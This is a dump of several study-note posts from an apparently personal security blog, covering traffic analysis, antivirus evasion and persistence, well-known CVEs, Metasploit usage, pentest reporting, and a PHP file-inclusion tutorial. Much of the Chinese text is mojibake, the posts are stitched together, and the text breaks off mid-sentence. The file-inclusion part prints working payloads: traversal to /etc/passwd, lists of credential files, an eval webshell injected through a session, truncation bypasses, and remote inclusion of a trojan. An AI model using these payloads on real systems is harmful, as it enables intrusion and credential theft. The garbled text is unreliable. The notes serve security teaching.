ç»¼åˆåˆ†ææ•°æ®åŒ…ä¸­çš„å¤šå±‚åè®®  Flow analysis: åˆ†æä¸€ç³»åˆ—è¿è´¯çš„æ•°æ®åŒ…ï¼šFlow     Protocol analysis\næˆ‘ä»¬ä¸ºä»€ä¹ˆè¦è¿›è¡Œåè®®åˆ†æï¼š  äº†è§£æ•°æ®æ˜¯å¦‚ä½•ä¼ è¾“çš„ï¼Œä»¥åŠå…¶ä¸­åè®®éœ€è¦è®¾ç½®çš„å‚æ•°æ˜¯å¦‚ä½•çš„  è§£æå…¶ä¸­çš„ä¿¡æ¯       Packet analysis æ•°æ®åŒ…åˆ†æ\næˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦æ•°æ®åŒ…åˆ†æ  é€šè¿‡ä¸€ç³»åˆ—ä¼ è¾“çš„æ•°æ®åŒ…æ¥è§‚å¯Ÿåè®®  ä½¿ç”¨æ•°æ®åŒ…ä»¥åŠè¿‡æ»¤å™¨æ¥è¯†åˆ«æ„Ÿå…´è¶£çš„æ•°æ®åŒ…   æ•°æ®åŒ…åˆ†æéœ€è¦åšäº›ä»€ä¹ˆï¼Ÿ   å¯¹äºç½‘ç»œä¸“å®¶æ¥è¯´ï¼š  æ£€æµ‹ç½‘ç»œæ˜¯å¦å¥åº·     å¯¹äºå®‰å…¨ä¸“å®¶æ¥è¯´ï¼š  è¢«åŠ¨çš„è¿›è¡Œæ¼æ´æµ‹è¯•ï¼ˆè¢«åŠ¨åœ°ç­‰ç€æ¼æ´æˆ–è€…æ”»å‡»å‡ºç°ï¼‰     å¯¹äºæ”»å‡»è€…æ¥è¯´   è¢«åŠ¨çš„æ”»å‡»å·¥å…·   çªƒå–ä¿¡æ¯ï¼ˆå¯†ç ï¼‰     å®ç°ä¸Šå’Œä¹‹å‰è¯´çš„ä¸€æ ·ï¼Œæˆ‘ä»¬åˆ†æçš„å®è´¨ä¸Šæ˜¯Frameï¼Œå…¶ä½œä¸ºé“¾è·¯å±‚çš„æ•°æ®å°è£…å½¢å¼ï¼ŒåŒ…å«äº†æ‰€æœ‰å‘ä¸Šçš„header,èƒ½å¤Ÿæ›´å¥½çš„ååº”æ›´å¤šçš„ä¿¡æ¯  ç”¨äºåˆ†æçš„æŠ€æœ¯ : - Pattern matching - é€šè¿‡åŒ¹é…ç‰¹å®šå‚æ•°çš„å€¼æ¥åˆ†ææ£€æµ‹ç‰¹å®šçš„æ•°æ®åŒ…ï¼Œä¾‹å¦‚ if source IP address = foo - Parsing protocol fields - ä»ä¸åŒlayersçš„headerä¸­è·å–ä¿¡æ¯ï¼Œä¾‹å¦‚Wiresharkå¯ä»¥çœ‹åˆ°æ•´ä¸€ä¸ªIP headerçš„ä¿¡æ¯ - Packet filtering - é€šè¿‡protocolæ¥ç­›é€‰æƒ³è¦åˆ†æçš„æ•°æ®ï¼Œæ¯”å¦‚åªæŸ¥çœ‹ICMPåŒ…çš„ä¿¡æ¯     Flow analysis æµé‡åˆ†æ\næµé‡åˆ†æé¡¾åæ€ä¹‰å°±æ˜¯å¯¹äºä¸€ç»„çš„æ•°æ®åŒ…è¿›è¡Œåˆ†æ ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦è¿›è¡Œæµé‡åˆ†æ  å¯»æ‰¾ç‰¹å¾æµé‡ï¼ˆé‡å¤çš„é€šä¿¡ï¼‰  å•ç‹¬éš”ç¦»å¯ç–‘çš„æ´»åŠ¨å¹¶ä¸”ä¸¢å¼ƒä¸ç›¸å…³çš„ä¿¡æ¯  åˆ†ææ›´é«˜å±‚çš„åè®®ï¼Œæ¯”å¦‚HTTPï¼ŒSSL  ä»æµé‡æå–æ•´ä½“æ•°æ®ï¼ˆæ¯”å¦‚æå–å‡ºæ•´ä¸€ä¸ªä¼ è¾“çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰   åœ¨Wiresharkä¸­æˆ‘ä»¬å¯ä»¥é€‰æ‹©HTTP/UDP/TCP Streamè¿›è¡Œåˆ†æ  å…¶ä»–æµé‡åˆ†ææŠ€æœ¯   ç½—åˆ—é€šä¿¡ä»¥åŠæµé‡  å¯ä»¥æ ¹æ®ç‰¹å¾ä¿¡æ¯å¯¹æ•°æ®æµè¿›è¡Œåˆ†ç±»æå–     æ•°æ®æµå¯¼å‡º  å¯¼å‡ºä¹‹ååœ¨æœªæ¥ç”¨ä½œä»–ç”¨     æ–‡ä»¶ä»¥åŠæ•°æ®æŒ–æ˜  ä»æ•°æ®æµåˆ†æä¸­æ‹¼æ¥æŒ–æ˜å‡ºæœ‰ç”¨çš„æ–‡ä»¶ä»¥åŠä¿¡æ¯     List conversations and flows  List all conversations and/or flows within a packet capture or only specific flows based on their characteristics     Export a flow  Isolate a flow or multiple flows, and store the flow(s) of interest to disk for further analysis     File and data carving  Extract files or other data of interest from the reassembled flow       ","date":"2022-05-26T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_2_tcp_ip_protocol_architecture_sniffing_and_traffic_analysis/","title":"NSE Week 2:  TCP/IP protocol architecture, sniffing and traffic analysis"},{"content":"SCT Topic 10: Advanced Strategies Stealthiness Strategies Before launch the attack, the attacker should check AV(anti-virus)/Filters detection, otherwise, their actions will leave some warnings or tracks in the target system  Encoding (e.g., msfencode, also use multiple at once), change the encoding of the file, the checking signature of malware analysis may not be triggered.  Transient malware, e.g., run only in memory  Mimicry, simulate legitimate app process to escape from the anti-virus  Packers, obfuscate malicious code, and unpack routine at runtime   Note: Offline version of AVs offer less functionality Persistence Strategies Attackers also want to keep their malware running on target system   Payloads in Metasploit (e.g, reverse shell, meterpreter) for further interactions   Scheduled Tasks, launch everytime after users rebooting systems   Backdoors, leave backdoor for further interaction and exploitation   In BeEf Stored XSS will remain valid whenever the victims visits the page Possible to do some \u0026ldquo;privilege escalation\u0026rdquo; and \u0026ldquo;sandbox evasion\u0026rdquo;   Keep up to date Keep track of what bad guys are doing  Technical Reports  MITRE CVEs - https://cve.mitre.org/about/documents.html  Google Project Zero  Exploit DB  https://www.reddit.com/r/netsec/   Adversarial Machine Learning  Definition of machine Learning A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E  Tom Mitchell, Machine Learning     Machine Learning for Security  5 Phases of ML for Security  Data Collection  Pre-processing and Feature Engineering  Model Selection and Training  Testing and Evaluation  Evaluation against Time Evolution and Adversaries     Machine Learning Algorithms Categories  Classification: given a labeled dataset, find a model that separates instances into classes  Regression: given some points, try to generalise and predict real-valued numbers  Clustering: given an unlabeled dataset, try to group similar elements   Performance metrics I used to confuse about the metrics used in ML, I think the difficult point is how to define the Positive and Negative We assume we are doing a malware classification, thus our target is to determine where a sample is a malware or not? If we decide one program is a malware, we called it Positive result, otherwise, it is a Negative result.  Thus, a True Positive means, we think a program is a malware, it is actually a real malware  a True Negative means, we think a program is a goodware, it is actually a goodware  a False Positive means, we think a program is a malware, but it is actually a goodware, which we also called false alarm  a False Negative means, we think a program is a goodware, but it is actually a malware     Precision and Recall\nPrecision = TP / (TP + FP), it reflects the machine learning algorithm\u0026rsquo;s performance on \u0026ldquo;How many times you are right?\u0026rdquo;, TP + FP indicates the total sample are labeled by ML as malware (positive) Recall = TP / (TP + FN), it reflects \u0026ldquo;How many malware found by you\u0026rdquo;, TP + FN means all the actual malware within the dataset F1-Score is defined as the harmonic mean of Precision and Recall F1-Score = 2 x (Precision x Recall) / (Precision + Recall) Accuracy = (TP + TN) / (TP + FP + TN + FN), indicates that all correct decision made by the ML module  Is Accuracy a good metric in Security?  Accuracy can be misleading when datasets are very imbalanced  In a malware dataset, the ratio of goodware and malware could be like 1000 : 1, thus it is easily to find benign program than malware, the dataset can easily become 99%       Evasion An attacker may try to evade detection or poison training data    Spam Filtering\nFeatures: presence/absence of words Attacks: bad word obfuscation / good word insertion    Adversarial Machine Learning: Taxonomy   Test-time Evasion   Training-time Poisoning   Inference Attacks   Model Stealing    Membership Inference    Shadow Model Estimation   ","date":"2022-05-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_10_advanced_strategies/","title":"SCT Topic 10: Advanced Strategies"},{"content":"SCT Topic 9: Exploitation Phase + Industry Guest Seminar Vulnerabilities and Exploits We often see these two terms, and sometimes we even interchangeable use both of them, but what\u0026rsquo;s the difference between them? We should say first there is a vulnerability found on software or system, and there is an exploit which is the code that takes advantage ofof the vulnerability to compromise CIA of the target service. Furthermore, the distinction between software vulnerability and software bug is:  A vulnerability derives from a software bug, which means a vulnerability must be a software bug  But only a software bug allows attacker to compromise the CIA of a system, it can be called a vulnerability   How to find exploits of the vulnerabilities?  Zero-day from underground market (be aware of fake exploits, always try to understand the exploit coee before running them)  Authorised sources: Security Focus and Exploit database, searchsploit on kali linux   Popular Vulnerabilities Heartbleed Before we elborate the details of the vulnerability, let\u0026rsquo;s first talk about what is a SSL Heatbeat?  SSL Heartbeat A message to know that two computer are still connected to each other, it contains information:  Sender sends a message M of a declared length L  Receiver allocates a memory buffer of the decalred length L, copies message M in memory, and reads it back to the sender     Vulnerability happens due to missing checkgaurd: receiver never checked the message is actually the same length as claimed to be!  We can see in above example, in the heartbeat packet, it constains both information client required to return and also sensitive information. Attacker could require the information more than it should be to let server reveal those sensitive information. Let\u0026rsquo;s dig deeper into source code, the root cause back to one line code:  memcpy(bp, pl, payload) which copy the data without checking the size  bp = destination  pl = source  payload = length     How to fix? check if the size which client claimed to return is as same as it required. Dirty COW https://dirtycow.ninja/ \u0026ldquo;A race condition was found in the way the Linux kernel\u0026rsquo;s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. It is a local privilege escalation vulnerability  Copy-on-write (COW)  is a resource-management techniques  If a resource is duplicated but not modified  the duplicated file is not actually instantiated until the source first change  for optimisation of resource usage     An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.\u0026rdquo; (RH) This flaw allows an attacker with a local system account to modify on-disk binaries, bypassing the standard permission mechanisms that would prevent modification without an appropriate permission set.  Impact  A read-only file can become writable  Used with remote root access     Fix: use a copy-on-write flag PHPMailer RCE  PHPMailer Normal Process  PHPMailer gets user requests (to send a mail)  PHPMailer validates user-supplied data (from xxx to xxx, content, \u0026hellip;)  PHPMailer sends the data to the PHP mail() function  PHPMailer calls the OS command \u0026quot;sendmail\u0026quot;    sendmail command /usr/bin/sendmail -i -t -f \u0026lt;sender\u0026gt; \u0026hellip;   -i: don\u0026rsquo;t treat a message content with only a \u0026lsquo;.\u0026rsquo; as the end   -f: sender: set the envelope sender address   -t: extract recipients from message headers     The Issue: PHPMailer does not sanitise email values properly before sending them to sendmail We can see how PHPMailer validate the user-supplied data, and below is the actually parameters read by sendmail script  Then we can compose a payload and inject the malicious command into /var/www/cache/phpcode.php file and the malicious injected code will be executed  ImageTragick Fun fact, after people make the website of vulnerabilities on ImageMagick, the impact then become gradually serious https://imagetragick.com/   ImageMagick RCE [CVE-2016-3714]\nit is a Command injection vulnerability, due to insufficient parameter filtering during conversion of file formats ImageMagick delegates some tasks to other services, such as wget, but it does not check the parameters which leave space for command injection      File Deletion\n   MetaSploit Framework MetaSploit framework is a powerful tools, it supports   Initial reconnaissance phase  Results can be saved and stored into a database  Run nmap to check the status of target system     Vulnerability scanniing and Execution of exploits  Exploits can be customised     Terminology in Metasploit  Exploit the code which attackers or security testers could take advantage of a flaw within a system  Payload The code the attacker wants to be return after successful exploitson target system (e.g., reverse shell, bind shell) for further interactions  Shellcode Assembly instructions used as payload when the exploitation occurs  Module Piece of software that can be used by metasploit  Exploit module: to conduct attack  Auxiliary module: to support an attack (e.g., scanning)  Post exploitation module    Listener component that waits connection of sorts   We will mainly focus on MSFconsole (which is based on command line instructions)  Commands on msfconsole  search portscan  use auxiliary/scanner/portscan/tcp  set rhosts x.x.x.x  run     Every command will follow the context left by previous commandsMetaSploit Exploitation  Main tools  msfconsole  msfpayload  msfencode    Initial basic commands  msf\u0026gt; show exploits  msf\u0026gt; show auxiliary  msf\u0026gt; show options  msf\u0026gt; search \u0026lt;string\u0026gt;  msf\u0026gt; show payloads: platform-speciï¬c pieces of code delivered to the target platform (if you are in an actual exploit, you will see only payloads for that attack)       Meterpreter\nAfter the exploitation, meterpreter used as a payload for further interaction It is a special shell with additional commands  screenshot  sysinfo  shell  killav     Exploitation example   Initial reconnaissance phase\nsudo nmap -O -vv 172.17.0.2      vsftpd\n  search vsftpd exploits module     show options      set rhost and run        Exploitation procedures\n Reconnaissance phase (nmap) for target system information (OS version, opened port status)  Search and grep exploits and auxiliary modules  Select payload for further interactions (reverse shell)  Fill the options for modules and payload  Run the exploits  Interact with shells     ","date":"2022-05-23T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic-9_exploitation_phase_industry_guest_seminar/","title":"SCT Topic 9: Exploitation Phase + Industry Guest Seminar"},{"content":"SCT Topic 5: Professional Reporting of Security Testing Findings Taxonomy of security testing activities This part actually overlap with what we talked about in SCT Topic 1, you can refer to there for more details. Vulnerability assessment Vulnerability assessment (VA) aims to execute the tools to identify vulnerabilities in systems and software. To be notice, VA just use the tools and make report and comments based on the result, WITHOUT any human-driven inspection and further interaction. And professional security testers need to use both free and paid tools, because we have to assume attackers also use all tools to scan for vulnerabilities. Penetration testing Penetration Testing (PT) simulate the attackers\u0026rsquo; behaviours and try to \u0026ldquo;penetrate\u0026rdquo; into a computer ssytem.  Pre-engagemnt interactions  Intelligence gathering  Threat modelling  Vulnerability analysis  Exploitation  Post exploitation  Reporting   Red Teaming Red teaming aims to emulate Tactics, Techniques and Procedures (TTPs) of adversaries in a more realistic way.  Red Team  simulate attackers  hired security testers    Blue Team  real-world defenders  not informed the attacks in advance       Differences Between PT and RT\n    Penetration testing Red teaming     Security assessment Methodical Flexible    Restricted scope No rules (without being illegal)    Engagement of 1 - 2 weeks Engagement of between 2 weeks and 6 months   Scope Generally announced No announcement    identifies vulnerabilities Test Blue team on programs, policies, tools and skills    Red teaming estimate the organisation\u0026rsquo;s with two metrics:  Time To Detect (TTD)  Time to Mitigate (TTM)     Professional reporting of results Three fundamental objectives of a professional report:  Describe the findings  Rate the vulnerabilities  Explain how the results will affect the customer in the real world   Possible sections in professional report  Introduction/Overview  Scope and objectives  Deviations from the Statement of Work  Methodology  Significant assessment findings (critical findings)  Positive observations  findings summary  Detailed summary  Appendix   Essentails details should be elaborated in a report:   Risk, exploitability and impact values : - Risk, how critical a certain vulnerability is  Exploitability, feasibility of taking advantage of a vulnerability  Impact, estimation of the damage     Category : - define the category a vulnerability belongs to  e.g., data exposure, access control, validation     Location : - The specific location of the vulnerability within the target system   Description : - Detailed description, including code examples on how to exploit it and the damage could be done   Steps to replicate : - Pick the easiest one to replicate the exploitation of vulnerability   Recommendation : - Suggestion about how the client could remediate the vulnerability  May include patching guides, temporary hotfixes, or rethinking of system architecture     Suggestions for reporting  Don\u0026rsquo;t show automatically generated report to client  Rate the vulnerabilities properly (refer to the CIA)  Separate theoretical v.s. real findings  Make sure vulnerabilities are real  Reproducibility steps is important  Remediations and solutions are important  Standardise all templates   ","date":"2022-05-22T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_5_professional_reporting_of_security_testing_findings/","title":"SCT_Topic_5_Professional_Reporting_of_Security_Testing_Findings"},{"content":"Local/Remote File Inclusion æ–‡ä»¶åŒ…å«æ¼æ´ å‚è€ƒæ–‡ç« ï¼šWebå®‰å…¨å®æˆ˜ç³»åˆ—ï¼šæ–‡ä»¶åŒ…å«æ¼æ´ æ–‡ä»¶åŒ…å«æ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒï¼Ÿ æ–‡ä»¶åŒ…å«åœ¨ç½‘é¡µå¼€å‘ä¸­ä¼šç»å¸¸è¢«ä½¿ç”¨åˆ°ï¼Œæ¯”å¦‚å¯¼èˆªæ ï¼Œäº¦æˆ–æ˜¯é¡µçœ‰ï¼Œå¾€å¾€éƒ½æ˜¯å•ç‹¬çš„ä¸€ä¸ªphpæ–‡ä»¶ï¼Œç„¶åæ¯ä¸€ä¸ªé¡µé¢åªéœ€è¦å°†è¿™ä¸ªphpæ–‡ä»¶åŒ…å«è¿›æ¥è€ŒèŠ‚çœäº†é‡å¤å¼€å‘çš„æ—¶é—´ï¼Œè¿˜æœ‰ä¸€ç§å¸¸è§çš„å½¢å¼å°±æ˜¯sqlè¿æ¥ï¼Œå¤§å®¶åœ¨æ­å»ºé¶åœºçš„æ—¶å€™ç›¸ä¿¡ç»å¸¸éƒ½ä¼šé‡åˆ°çš„é…ç½®é—®é¢˜ï¼Œä¾‹å¦‚ä¿®æ”¹ç«¯å£å·ï¼ŒMysqlè´¦å·å¯†ç ç­‰ï¼Œéƒ½å¯ä»¥åœ¨ä¸€ä¸ªä¸“é—¨çš„phpæ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œè€Œä¸æ˜¯éœ€è¦åœ¨æ¯ä¸€ä¸ªsqlè¿æ¥çš„åœ°æ–¹å»åšä¿®æ”¹ã€‚ PHPæ–‡ä»¶åŒ…å«å‡½æ•°ï¼š require() require_once() include() include_once() include() å’Œ require çš„å´åˆ«åœ¨äºå½“åŒ…å«è¿‡ç¨‹ä¸­å¤„ç†é”™è¯¯çš„æ–¹å¼ï¼Œincludeä¼šæŠ›å‡ºè­¦å‘Šï¼Œç¨‹åºæ­£å¸¸è¿è¡Œï¼›è€Œrequireä¼šé€‰æ‹©ç›´æ¥æŠ¥é”™å¹¶ä¸”é€€å‡ºç¨‹åºçš„æ‰§è¡Œ ä¸¤ä¸ªonceéƒ½è¡¨ç¤ºæ–‡ä»¶åªåŒ…å«ä¸€æ¬¡ï¼Œä¸ºäº†é¿å…é‡å¤åŒ…å«å¸¦æ¥çš„å‡½æ•°é‡å®šä¹‰ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå›  å¯¹äºç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšä¸¥æ ¼çš„å®¡æ ¸ï¼Œè¿˜æ˜¯è¿™ä¸ªè€é—®é¢˜ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦ç”¨æˆ·çš„è¾“å…¥ï¼Œé‚£ä¹ˆå¦‚æœæ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„å®¡æ ¸ï¼Œè¢«é»‘å®¢åŒ…å«äº†å…¶ä»–æ¶æ„çš„æ–‡ä»¶ï¼Œäº¦æˆ–æ˜¯è¢«åˆ©ç”¨æ‰§è¡Œäº†é¢å¤–çš„ä»£ç ï¼Œå°±ä¼šé€ æˆå±å®³ã€‚ \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); ?\u0026gt;ä¾‹å¦‚è¿™é‡Œè¿™ä¸ªGETå‚æ•°ï¼Œå°±å¯ä»¥è½»æ˜“è¢«ä¿®æ”¹ï¼ˆä¿®æ”¹urlå³å¯ï¼‰ Local File Inclusion æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™é‡Œâ€œæœ¬åœ°â€æŒ‡çš„æ˜¯æœåŠ¡å™¨æœ¬åœ°ï¼Œä¸»è¦æ˜¯åˆ©ç”¨ç›®å½•éå†çš„æ‰‹æ³•åŠ ä¸Šæ“ä½œç³»ç»Ÿå¸¸è§çš„æ•æ„Ÿæ–‡ä»¶è·¯å¾„æ¥è¯»å–ä¿¡æ¯ Windowsç³»ç»Ÿ c:\\boot.ini // æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ c:\\windows\\system32\\inetsrv\\MetaBase.xml // IISé…ç½®æ–‡ä»¶ c:\\windows\\repair\\sam // å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  c:\\ProgramFiles\\mysql\\my.ini // MySQLé…ç½® c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL rootå¯†ç  c:\\windows\\php.ini // php é…ç½®ä¿¡æ¯ *inux ç³»ç»Ÿ /etc/passwd // è´¦æˆ·ä¿¡æ¯ /etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶ /usr/local/app/apache2/conf/httpd.conf // Apache2é»˜è®¤é…ç½®æ–‡ä»¶ /usr/local/app/apache2/conf/extra/httpd-vhost.conf // è™šæ‹Ÿç½‘ç«™é…ç½® /usr/local/app/php5/lib/php.ini // PHPç›¸å…³é…ç½® /etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶ /etc/my.conf // mysql é…ç½®æ–‡ä»¶ åˆ©ç”¨çš„å½¢å¼å¤§è‡´å¦‚æ­¤ï¼š www.example.org/index.php?filename=../../../../../../../etc/passwd Session æ–‡ä»¶åŒ…å«æ¼æ´ Sessionæ–‡ä»¶åŒ…å«æ¼æ´ä¸€èˆ¬å‘ç”Ÿåœ¨ç”¨æˆ·è¾“å…¥å°†ä¼šå­˜å…¥sessionæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ¤å…¥æ¶æ„ä»£ç åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶åæ‰§è¡Œsessionæ–‡ä»¶è®©é‡Œé¢çš„æ¶æ„ä»£ç è¢«è§£æç„¶åæ‰§è¡Œ \u0026lt;?php session_start(); $ctfs=$_GET[\u0026#39;ctfs\u0026#39;]; $_SESSION[\u0026#34;username\u0026#34;]=$ctfs; ?\u0026gt;æˆ‘ä»¬å¯ä»¥é€šè¿‡phpinfoè·å–æˆ‘ä»¬æœ¬åœ°çš„sessionå­˜å‚¨ä½ç½®ï¼Œç„¶åçŒœæµ‹ç›®æ ‡æœåŠ¡å™¨çš„sessionå­˜æ”¾åœ°å€ å‡è®¾ä¸º/Applications/MAMP/tmp/php  ç„¶åæˆ‘ä»¬å¯ä»¥å°†æ¶æ„ä»£ç å½“ä½œå‚æ•°æ‰§è¡Œ localhost/session.php?ctfs=\u0026lt;?php phpinfo();?\u0026gt; ç„¶åé€šè¿‡æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·ç¡®è®¤cookieçš„åå­— æ¥ç€åœ¨æœ¬åœ°æŸ¥çœ‹æˆ‘ä»¬çš„æ¶æ„ä»£ç æ˜¯å¦æ³¨å…¥æˆåŠŸ   æ¥ç€å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œphpinfoæ˜¾ç¤ºæˆåŠŸ  åŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥æ³¨å…¥ä¸€å¥è¯æœ¨é©¬ localhost/lrfiSession.php?ctfs=\u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt; ç„¶åç”¨èšå‰‘è¿æ¥æˆåŠŸ  å¸¸è§é™åˆ¶ç»•è¿‡   %00æˆªæ–­\næ¡ä»¶ï¼šmagic_quotes_gpc = Off phpç‰ˆæœ¬\u0026lt;5.3.4 \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename . \u0026#34;.html\u0026#34;); ?\u0026gt;é€šè¿‡æ·»åŠ %00æˆªæ–­åé¢çš„html     è·¯å¾„é•¿åº¦æˆªæ–­\næ¡ä»¶ï¼šwindows OSï¼Œç‚¹å·éœ€è¦é•¿äº256ï¼›linux OS é•¿äº4096:  Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼›  Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚   æ²¿ç”¨ä¸Šä¸€ä¸ªä¾‹å­ï¼Œå°†htmlè¶…å‡ºèŒƒå›´åèˆå¼ƒ \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename . \u0026#34;.html\u0026#34;); ?\u0026gt;localhost/lrfiTest.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././     ç‚¹å·æˆªæ–­\næ¡ä»¶ï¼šwindows OSï¼Œç‚¹å·éœ€è¦é•¿äº256 \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename . \u0026#34;.html\u0026#34;); ?\u0026gt;localhost/lrfiTest.php?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................   Remote File Inclusion è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™é‡Œçš„â€œè¿œç¨‹â€æŒ‡çš„æ˜¯åŒ…å«æœåŠ¡å™¨ä»¥å¤–çš„è¿œç¨‹æ–‡ä»¶ æ¼æ´æ‰§è¡Œæ¡ä»¶ è¿™é‡Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªå‚æ•°çš„å¼€å¯ allow_url_fopen = Onï¼ˆæ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼‰ allow_url_include = Onï¼ˆæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ï¼‰ \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); ?\u0026gt;localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php å¸¸è§ç»•è¿‡   é—®å·ç»•è¿‡\nlocalhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php?     #ç»•è¿‡\nlocalhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php#   PHP Supported Protocols and Wrappers PHPä¼ªåè®® PHPä¼ªåè®®ä¸»è¦æ˜¯ä¸€ç³»åˆ—ä»¥ä¸URI schemeçš„å¤–å½¢ç›¸ä¼¼çš„å°è£…åè®®ï¼Œç”¨æ¥ä¸ fopen(), copy(), file_exists(), filesize() é…åˆä½¿ç”¨ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨ stream_wrapper_register() åˆ›é€ æ–°çš„æ–¹æ³•ã€‚ PHPåªæ¥å— scheme://... çš„å½¢å¼ï¼Œè€Œ scheme:/..., scheme:... éƒ½ä¸è¡Œ åœ¨CTFä¸­çš„è¿ç”¨ï¼Œä¸ªäººç›®å‰çš„ç†è§£æ˜¯ï¼Œå½“æœåŠ¡å™¨ç«¯å­˜åœ¨éœ€è¦ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œå¹¶ä¸”è°ƒç”¨è¿™ä¸ªå‚æ•°çš„å‡½æ•°å¯ä»¥ä¸PHPä¼ªåè®®è¿ç”¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡PHPä¼ªåè®®æ¥æ„é€ ä¸€äº›PHPæ“ä½œæ¥å®ç°æ¶æ„è¡Œä¸ºï¼ˆç›¸å½“äºåœ¨å†™phpä»£ç ï¼‰  file:// â€” Accessing local filesystem  http:// â€” Accessing HTTP(s) URLs  ftp:// â€” Accessing FTP(s) URLs  php:// â€” Accessing various I/O streams  zlib:// â€” Compression Streams  data:// â€” Data (RFC 2397)  glob:// â€” Find pathnames matching pattern  phar:// â€” PHP Archive  ssh2:// â€” Secure Shell 2  rar:// â€” RAR  ogg:// â€” Audio streams  expect:// â€” Process Interaction Streams   php:// php:// ä¼ªåè®®å¯ä»¥è®¿é—®PHPè‡ªå·±çš„è¾“å…¥å’Œè¾“å‡ºæµä»¥åŠé”™è¯¯æè¿°æè¿°ç¬¦ï¼Œè¿˜æœ‰è®¿é—®å†…å­˜å’Œç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠè¿‡æ»¤å™¨æ¥å†³å®šæƒ³è¦è®¿é—®çš„è¯»å†™æ–‡ä»¶èµ„æº   php://stdin, php://stdout å’Œ php://stderr\nä½¿ç”¨php://stdin, php://stdout å’Œ php://stderrå¯ä»¥ç›´æ¥è®¿é—®PHPè¿›è¡Œæ‰€å¯¹åº”çš„è¾“å…¥æˆ–è€…è¾“å‡ºæµï¼Œè®¿é—®çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯å¼•ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€ŒçœŸæ­£çš„STDINæ˜¯ä¸ä¼šæ”¶åˆ°å½±å“çš„ php://stdin æ˜¯åªè¯»çš„ï¼Œ php://stdout å’Œ php://stderr æ˜¯åªå†™çš„ã€‚     php://filter\nphp://filter å¯ä»¥ä¸ readfile(), file(), file_get_contents() 